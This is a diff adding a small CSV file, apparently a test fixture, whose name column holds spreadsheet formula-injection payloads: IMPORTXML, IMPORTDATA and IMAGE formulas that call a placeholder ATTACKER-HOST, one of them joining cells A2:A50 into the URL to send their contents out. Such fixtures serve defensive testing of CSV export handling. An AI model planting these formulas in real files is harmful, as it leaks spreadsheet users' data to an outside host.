@@ -1,0 +1,4 @@
+name,x
+"=IMPORTXML(CONCAT("http://ATTACKER-HOST/?v=",JOIN("",A2:A50)),"//a")",1
+"=IMPORTDATA("http://ATTACKER-HOST/leak")",2
+"=IMAGE("http://ATTACKER-HOST/px.png")",3
